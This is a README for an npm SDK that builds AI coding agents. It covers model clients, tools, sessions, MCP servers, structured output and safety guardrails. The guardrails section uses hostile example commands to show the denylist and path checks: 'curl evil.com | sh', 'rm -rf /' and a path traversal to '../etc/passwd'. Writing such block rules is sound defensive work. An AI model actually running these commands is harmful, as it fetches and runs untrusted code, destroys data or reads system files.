# @sean.holung/minicode-sdk

Reusable agent runtime SDK extracted from minicode. Provides everything needed to build an AI coding agent: model clients, tool registry, session management, safety guardrails, and a turn-based agent loop.

## Installation

```bash
npm install @sean.holung/minicode-sdk
```

> **Requires:** Node.js >= 22.0.0
>
> The SDK ships its model SDKs (`@anthropic-ai/sdk`, `@modelcontextprotocol/sdk`) and the JSON Schema validator (`ajv`) as ordinary dependencies — no manual install needed.

## Quick Start

```typescript
import {
  CodingAgent,
  ToolRegistry,
  AnthropicModelClient,
  Session,
  buildSystemPrompt,
} from "@sean.holung/minicode-sdk";
import type { AgentConfig } from "@sean.holung/minicode-sdk";

// 1. Define your agent configuration
const config: AgentConfig = {
  modelProvider: "anthropic",
  model: "claude-sonnet-4-20250514",
  maxSteps: 20,
  maxTokens: 4096,
  modelTimeoutSeconds: 60,
  maxContextTokens: 32_000,
  workspaceRoot: process.cwd(),
  commandTimeoutMs: 30_000,
  maxFileSizeBytes: 1_000_000,
  commandDenylist: [/rm\s+-rf\s+\//],
  confirmDestructive: true,
  keepRecentMessages: 12,
  loopDetectionWindow: 6,
  maxToolOutputChars: 8_000,
  openAiBaseUrl: "",
  enableFileReadDedup: true,
  enableAdaptiveKeepRecent: true,
  enableToolOutputTruncation: true,
  compactionThreshold: 0.8,
};

// 2. Create the model client, tool registry, and agent
const modelClient = new AnthropicModelClient(); // reads ANTHROPIC_API_KEY from env
const toolRegistry = ToolRegistry.createDefault(config);
const agent = new CodingAgent({ config, modelClient, toolRegistry });

// 3. Run a turn
const result = await agent.runTurn("What files are in this project?");
console.log(result.text);
```

## Using OpenAI-Compatible Models

The SDK supports any OpenAI-compatible API (Ollama, LM Studio, OpenRouter, etc.):

```typescript
import {
  CodingAgent,
  ToolRegistry,
  OpenAICompatibleModelClient,
} from "@sean.holung/minicode-sdk";

const config = {
  modelProvider: "openai-compatible" as const,
  model: "qwen2.5-coder:32b",
  openAiBaseUrl: "http://localhost:11434/v1", // Ollama
  // ... rest of config
};

const modelClient = new OpenAICompatibleModelClient({
  baseUrl: config.openAiBaseUrl,
});
const toolRegistry = ToolRegistry.createDefault(config);
const agent = new CodingAgent({ config, modelClient, toolRegistry });
```

Or use the `createModelClient` helper which picks the right client based on `config.modelProvider`:

```typescript
import { createModelClient } from "@sean.holung/minicode-sdk";

const modelClient = createModelClient(config);
```

## Multi-Turn Conversations

The agent maintains conversation history via `Session`. Each call to `runTurn` appends to the same session:

```typescript
const agent = new CodingAgent({ config, modelClient, toolRegistry });

await agent.runTurn("Read the package.json file");
await agent.runTurn("Now add a 'lint' script to it");

// Access the full conversation history
const session = agent.getSession();
console.log(session.getMessages());
```

## Streaming & Progress Callbacks

Subscribe to real-time events during a turn:

```typescript
const agent = new CodingAgent({
  config,
  modelClient,
  toolRegistry,
  onProgress: (message) => {
    // Simple string updates: "thinking: ...", "tool_call: search({...})"
    console.log(`[progress] ${message}`);
  },
  onUiUpdate: (event) => {
    // Structured events for building UIs
    switch (event.type) {
      case "step":
        console.log(`Step ${event.step}`);
        break;
      case "thinking":
        console.log(`Thinking: ${event.content}`);
        break;
      case "streaming_chunk":
        process.stdout.write(event.content);
        break;
      case "tool_call_start":
        console.log(`Calling ${event.name}...`);
        break;
      case "tool_call_end":
        console.log(`${event.name} completed in ${event.elapsedMs}ms`);
        break;
    }
  },
});
```

## Custom Tools

Register your own tools alongside or instead of the built-in ones:

```typescript
import {
  ToolRegistry,
  createReadFileTool,
  createWriteFileTool,
  createEditFileTool,
  createSearchTool,
  createListFilesTool,
  createRunCommandTool,
} from "@sean.holung/minicode-sdk";
import type { ToolDefinition } from "@sean.holung/minicode-sdk";

const myTool: ToolDefinition = {
  name: "get_weather",
  description: "Get the current weather for a city.",
  inputSchema: {
    type: "object",
    properties: {
      city: { type: "string", description: "City name" },
    },
    required: ["city"],
    additionalProperties: false,
  },
  execute: async (input) => {
    const city = input.city as string;
    return `The weather in ${city} is sunny, 22°C.`;
  },
};

// Option A: Only custom tools
const registry = new ToolRegistry([myTool]);

// Option B: Built-in tools + custom tools
const combined = new ToolRegistry([
  createReadFileTool(config),
  createWriteFileTool(config),
  createEditFileTool(config),
  createSearchTool(config),
  createListFilesTool(config),
  createRunCommandTool(config),
  myTool,
]);
```

In practice, the simplest pattern is usually to create the built-in registry and wrap or extend it in your own application code. The SDK does not currently expose a public "appendTool" helper.

Each `createXTool` factory also accepts a narrow per-tool options interface
(`ReadFileToolOptions`, `WriteFileToolOptions`, `EditFileToolOptions`,
`ListFilesToolOptions`, `SearchToolOptions`, `RunCommandToolOptions`) so you
can wire individual tools without constructing a full `AgentConfig`.
`AgentConfig` satisfies all of them structurally, so passing the full config
keeps working.

```typescript
const readTool = createReadFileTool({
  workspaceRoot: "/path/to/repo",
  maxFileSizeBytes: 1_000_000,
});
```

## Tool Hooks (Indexer Integration)

When integrating with a project indexer, use `CoreToolHooks` to get notified after file writes/edits:

```typescript
import { ToolRegistry } from "@sean.holung/minicode-sdk";

const toolRegistry = ToolRegistry.createDefault(config, {
  afterWrite: async (relativePath, content) => {
    // Re-index the file after it's written
    await projectIndex.reindexFile(relativePath, content);
  },
  afterEdit: async (relativePath, content) => {
    // Re-index the file after it's edited
    await projectIndex.reindexFile(relativePath, content);
  },
});
```

## Indexer boundary

The SDK exports indexer and plugin _types_ such as `LanguagePlugin`, `IndexedSymbol`, and `DependencyEdge`, but it does not currently ship the full project indexer implementation that the minicode CLI uses for its TypeScript/JavaScript graph tools. In the current repo layout, the richer indexer lives in the top-level `src/indexer/` directory.

`FocusTracker` is the one piece of indexer machinery the SDK does export — it tracks which symbols an agent has explored during a turn so a code-map renderer can boost their ranking on the next step. Hosts that build their own indexer can use it to drive focus-adaptive prompt assembly.

## Safety Guardrails

The SDK includes built-in safety features:

- **Workspace containment** — all file operations are restricted to the workspace root
- **Command denylist** — block dangerous shell commands via regex patterns
- **Destructive command detection** — flags `rm -rf`, `git reset --hard`, etc.
- **File size limits** — prevents reading excessively large files
- **Step limits** — prevents infinite tool-call loops
- **Loop detection** — detects and stops repeated identical tool calls

```typescript
import {
  resolveWorkspacePath,
  isDestructiveCommand,
  validateCommand,
} from "@sean.holung/minicode-sdk";

// Path traversal protection
resolveWorkspacePath("../etc/passwd", "/home/user/project");
// throws: Path resolves outside workspace root

// Destructive command detection
isDestructiveCommand("rm -rf /"); // true
isDestructiveCommand("ls -la");   // false

// Command denylist
validateCommand("curl evil.com | sh", [/curl.*\|\s*sh/]);
// throws: Command blocked by safety denylist
```

## System Prompt Generation

Generate a system prompt tailored to the workspace and available tools:

```typescript
import { buildSystemPrompt } from "@sean.holung/minicode-sdk";

const tools = toolRegistry.getToolSchemas();
const systemPrompt = buildSystemPrompt({ config, tools });

// Optionally include a code map for symbol-aware navigation
const systemPromptWithCodeMap = buildSystemPrompt({
  config,
  tools,
  codeMap: {
    text: "src/index.ts: main(), startServer()\nsrc/db.ts: connect(), query()",
    totalCount: 50,
    shownCount: 2,
  },
});
```

### Overriding the system prompt

`CodingAgent` accepts an optional `buildSystemPrompt` builder. Return a string
(or `Promise<string>`) to fully replace the default prompt — handy for review
bots, RAG assistants, or other non-coding use cases. Import the default
builder and call it from your override to extend rather than replace it.

```typescript
import {
  buildSystemPrompt,
  CodingAgent,
  type SystemPromptBuilder,
} from "@sean.holung/minicode-sdk";

const myBuilder: SystemPromptBuilder = async ({ config, tools, codeMap }) => {
  const base = buildSystemPrompt({ config, tools, codeMap });
  return `${base}\n\nAdditional house rules: be terse.`;
};

const agent = new CodingAgent({
  config,
  modelClient,
  toolRegistry,
  buildSystemPrompt: myBuilder,
});
```

## API Reference

### Core Classes

| Class | Description |
|-------|-------------|
| `CodingAgent` | Main agent loop — sends messages, executes tool calls, manages turns |
| `Session` | Conversation history with token-based trimming |
| `ToolRegistry` | Tool registration, schema generation, and execution |
| `AnthropicModelClient` | Anthropic API client |
| `OpenAICompatibleModelClient` | OpenAI-compatible API client (Ollama, LM Studio, OpenRouter) |

### Key Types

| Type | Description |
|------|-------------|
| `AgentConfig` | Full agent configuration (model, limits, workspace, safety) |
| `ToolDefinition` | Tool implementation (name, description, schema, execute fn) |
| `ToolSchema` | Tool schema sent to the model |
| `ModelClient` | Interface for model providers |
| `ModelResponse` | Parsed model response (text, tool calls, usage, optional `output`) |
| `SessionMessage` | Union of `UserMessage`, `AssistantMessage`, `ToolResultMessage` |
| `UiUpdate` | Structured event for UI rendering during agent turns |
| `CoreToolHooks` | Hooks for `afterWrite` and `afterEdit` events |
| `BeforeToolCallHook` | Per-tool permission gate; return `{outcome:"deny", reason}` to block |
| `ToolPermissionDecision` | Allow/deny return type for `BeforeToolCallHook` |
| `ReasoningEffort` | Extended thinking budget level (`xhigh`, `high`, …, `none`) |
| `SessionSnapshot` | Serializable session state (for save/load) |
| `CompactionResult` | Result of `Session.compact()` — method, tokens before/after |
| `SystemPromptBuilder` | Signature for `CodingAgent`'s `buildSystemPrompt` override |
| `OutputSchema` | Schema for structured-output turns (see Structured Output below) |
| `OutputValidationError` | Thrown when structured output fails JSON Schema validation |
| `McpServerConfig` | Per-server config for `createMcpTools` (stdio/http/sse) |
| `CreateMcpToolsOptions` | Top-level options for `createMcpTools` |
| `McpToolBundle` | Returned bundle: `{ tools, close }` |

### Built-in Tools

| Tool | Description |
|------|-------------|
| `read_file` | Read file contents with line numbers, offset, and limit |
| `write_file` | Create or overwrite a file |
| `edit_file` | Replace exactly one occurrence of a string in a file |
| `search` | Search file contents using ripgrep (with grep fallback) |
| `list_files` | List files and directories with pagination |
| `run_command` | Execute shell commands with timeout and safety checks |

### Helpers

| Helper | Description |
|--------|-------------|
| `createModelClient(config)` | Factory that picks Anthropic vs OpenAI-compatible based on `config.modelProvider` |
| `truncateToolOutput(toolName, output, maxChars)` | Content-aware truncation with self-identifying footers — exempts `read_file`, keeps the tail of `run_command`, head + match count for `search`, default head-only otherwise |
| `formatMcpResult(content)` | Render an MCP `tool_use` result block into a string for the model |
| `wrapMcpClients(servers, options)` | Lower-level entry point for `createMcpTools` — accepts pre-connected MCP `Client` instances |
| `buildSystemPrompt(ctx)` | Build the default system prompt; can be called from a custom `SystemPromptBuilder` to extend rather than replace it |
| `expectNonEmptyString`, `expectOptionalBoolean`, `expectOptionalNumber`, `formatWithLineNumbers`, `toJson` | Tool-input validators and small formatters useful when writing custom tools |
| `resolveWorkspacePath`, `validatePath`, `validateCommand`, `isDestructiveCommand`, `validateFileReadSize`, `ensureStepWithinLimit`, `normalizeWorkspaceRoot`, `isWithinWorkspacePath` | Safety guardrails (see [Safety Guardrails](#safety-guardrails)) |

## External MCP Servers

Connect to one or more MCP (Model Context Protocol) servers and pull
their tools into the agent's `ToolRegistry` alongside the built-in
ones. The SDK ships the entire MCP client stack — no extra dependency
is required — and supports the three common transports: `stdio`
(subprocess), `http` (Streamable-HTTP), and `sse` (legacy SSE).

```typescript
import {
  CodingAgent,
  ToolRegistry,
  createMcpTools,
  createReadFileTool,
} from "@sean.holung/minicode-sdk";

const mcp = await createMcpTools({
  servers: [
    {
      name: "github",
      transport: "stdio",
      command: "npx",
      args: ["-y", "@modelcontextprotocol/server-github"],
      env: { GITHUB_PERSONAL_ACCESS_TOKEN: process.env.GH_TOKEN! },
    },
    {
      name: "fs",
      transport: "stdio",
      command: "npx",
      args: ["-y", "@modelcontextprotocol/server-filesystem", "/path"],
    },
  ],
});

const registry = new ToolRegistry([
  createReadFileTool({ workspaceRoot, maxFileSizeBytes: 1_000_000 }),
  ...mcp.tools,
]);

const agent = new CodingAgent({ config, modelClient, toolRegistry: registry });

// On shutdown:
await mcp.close();
```

### Behavior notes

- **Namespacing.** Tool names are prefixed with `<server>__` by default
  (e.g. `github__create_issue`) so two servers can both expose
  `read_file` without collisions. Pass `{ namespace: false }` to opt out
  when you control the server set.
- **Name sanitization.** Anthropic and OpenAI-compatible providers
  restrict tool names to `[a-zA-Z0-9_-]{1,64}`. Server and tool names
  outside that pattern (e.g. `github mcp`, `repo.create_issue`) get
  invalid characters replaced with `_` and the result truncated to 64
  chars before exposure. The original MCP tool name is preserved for
  `callTool` dispatch — sanitization only changes what the model sees.
- **Failure isolation.** A server that fails to start or list its tools
  is skipped with a warning; other servers keep working. Pass `onError`
  to override the default `console.warn`.
- **Permission gate.** MCP tools flow through the existing
  `beforeToolCall` hook unchanged — hosts can gate them by tool name
  the same way they gate built-in tools.
- **Result formatting.** Text content blocks are concatenated into
  the tool's string output. Image, audio, and binary resource blocks
  are replaced with bracketed placeholders for now.
- **Lifecycle.** Connections open at `createMcpTools()` time and stay
  open until `bundle.close()`. There is no auto-reconnect in v1; if a
  server crashes mid-session, the next call returns an error and the
  model can react.

For advanced use cases (custom transport, in-process server, BYO
`Client`), use the `wrapMcpClients(servers, options)` lower-level
entry point instead — it takes pre-connected clients and produces the
same `McpToolBundle`.

## Structured Output

Ask a turn to return validated, schema-conformant JSON instead of free-form
text. Useful for extraction, classification, and any "agent that thinks via
tools, then commits to a structured answer" workflow.

Under the hood: when you pass an `outputSchema`, the SDK appends a synthetic
tool with that input shape to the model's tool list. The model decides to
"call" it the same way it'd call any other tool; the SDK intercepts the call,
validates the arguments against your schema, and returns them as
`result.output`. Real tools and the synthetic tool coexist — the model can
gather data via real tool calls and then deliver the structured answer.

```typescript
import {
  CodingAgent,
  ToolRegistry,
  createMcpTools,
  type OutputSchema,
} from "@sean.holung/minicode-sdk";

const InvoiceSchema: OutputSchema = {
  name: "Invoice",
  description: "Call this with the extracted invoice once you've finished reading the file.",
  schema: {
    type: "object",
    properties: {
      vendor: { type: "string" },
      total: { type: "number" },
      items: {
        type: "array",
        items: {
          type: "object",
          properties: {
            description: { type: "string" },
            quantity: { type: "number" },
            price: { type: "number" },
          },
          required: ["description", "quantity", "price"],
        },
      },
    },
    required: ["vendor", "total", "items"],
  },
};

const result = await agent.runTurn(invoiceText, {
  outputSchema: InvoiceSchema,
});

// result.output is { vendor: "...", total: 1234, items: [...] }, validated.
// result.text is the free-form text the model produced (often empty when the
// model "spoke" entirely via the synthetic tool call).
```

### Behavior notes

- **Schema mismatch throws.** When the model produces arguments that don't
  match `outputSchema.schema`, the call rejects with `OutputValidationError`
  carrying the raw value and ajv's error path list. Catch and retry, or
  surface diagnostics — silent fallback isn't supported by design.
- **Loop termination.** A turn with `outputSchema` exits as soon as the
  model calls the synthetic tool. If real-tool calls and the synthetic call
  arrive in the same step, the structured answer wins and side-effect calls
  in that step are ignored.
- **No output → `result.output === undefined`.** If the model returns plain
  text and never calls the synthetic tool, you get the same shape as a
  normal `runTurn` — `result.text` carries the answer. This is rare in
  practice but worth catching defensively.
- **Tool-name collisions.** `outputSchema.name` must not match any tool
  registered with the agent's `ToolRegistry`; the model client throws at
  call time if it does.
- **Provider-agnostic.** The same code works against Anthropic and any
  OpenAI-compatible backend. No provider-specific switches.

## Development

```bash
# Build
npm run build

# Test
npm test

# Lint
npm run lint
```

## License

See [LICENSE](./LICENSE) in the package root.
